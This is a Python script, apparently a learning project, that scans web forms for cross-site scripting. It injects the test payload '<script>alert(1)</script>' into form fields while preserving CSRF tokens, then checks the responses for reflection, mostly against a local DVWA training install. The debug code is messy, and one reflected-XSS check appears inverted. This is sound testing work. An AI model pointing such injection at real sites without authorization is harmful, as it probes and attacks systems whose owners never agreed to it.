import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


XSS_PAYLOAD = "<script>alert(1)</script>"

def find_forms(url, session):

    response = session.get(url)

    soup = BeautifulSoup(
        response.text,
        "html.parser"
    )

    return soup.find_all("form")


def get_form_details(form):

    details = {}

    details["action"] = form.get("action")

    details["method"] = form.get(
        "method",
        "get"
    ).lower()


    inputs = []

    # Input fields
    for tag in form.find_all("input"):
        inputs.append({
            "type": tag.get("type"),
            "name": tag.get("name"),
            "value": tag.get("value", "")
        })

    # Textareas
    for tag in form.find_all("textarea"):
        inputs.append({
            "type": "textarea",
            "name": tag.get("name"),
            "value": tag.text
        })

    details["inputs"] = inputs
    print(details)
    return details

def scan_xss(url, session):
    page_url = url.lower()

    if "xss" not in page_url:
        return []
    
    results = []
    forms = find_forms(
        url,
        session
    )
    print("XSS FORMS:", len(forms))

    for form in forms:
        details = get_form_details(form)

        if details["action"] == "#" or not details["action"]:
            target = url
        else:
            target = urljoin(url, details["action"])

        data = {}

        for field in details["inputs"]:
            if not field["name"]:
                continue
            # Preserve CSRF token
            if field["type"] == "hidden":
                data[field["name"]] = field["value"]
                continue
            # Preserve submit button
            if field["type"] == "submit":
                data[field["name"]] = field["value"]
                continue
            # Inject payload only into text inputs
            data[field["name"]] = XSS_PAYLOAD

                
        print("Sending XSS payload:", data)
        print("Target:", target)


        if details["method"] == "post":
            response = session.post(
                target,
                data=data
            )
        else:
            response = session.get(
                target,
                params=data
            )
            
        if field["type"] == "hidden":
            data[field["name"]] = field["value"]
        elif field["type"] == "submit":
            data[field["name"]] = field["value"]
        else:
            data[field["name"]] = XSS_PAYLOAD
       
        
        with open("response.html", "w", encoding="utf-8") as f:
            f.write(response.text)
            
        print("Cookies:", session.cookies.get_dict())
            
        print("LOW.PHP:", "source/low.php" in response.text)
        print("MEDIUM.PHP:", "source/medium.php" in response.text)
        print("HIGH.PHP:", "source/high.php" in response.text)
        print("IMPOSSIBLE.PHP:", "source/impossible.php" in response.text)
            
        print("Contains script:", "<script>" in response.text)
        print("Contains escaped:", "&lt;script&gt;" in response.text)
        print("Contains alert:", "alert(1)" in response.text)
        print("Contains payload name:", "xss" in response.text.lower())
            
        # Debug prints (add these here)
        print("Response URL:", response.url)
        print("Payload found:", XSS_PAYLOAD in response.text)
        print("Response Status:", response.status_code)
        
        idx = response.text.lower().find("alert")
        print("Index:", idx)
        print("Hello index:", idx)
        print(response.text[idx-150:idx+200])
        
        security_page = session.get("http://localhost/dvwa/security.php")

        print("Current Security Level")

        idx = security_page.text.find("Security level is currently")

        print(security_page.text[idx:idx+120])

        page = response.text.lower()

        if (
            "hello" in page
            and "&lt;script&gt;" in page
            and "alert(1)" in page
        ):
            results.append({
                "Form Action": target,
                "Method": details["method"].upper(),
                "Status": "Potential XSS",
                "Reason": "User input reflected in page (possible XSS)"
            })
            
            
            # for stored
        page = response.text.lower()

        if (
            "<script>alert(1)</script>" in page
            or "name: <script>alert(1)</script>" in page
            or "message: <script>alert(1)</script>" in page
        ):
            results.append({
                "Form Action": target,
                "Method": details["method"].upper(),
                "Status": "Potential XSS",
                "Reason": "JavaScript payload reflected unescaped"
            })
            
        print(response.text[:1500])
        
        print("XSS RESULTS:", results)
            
    return results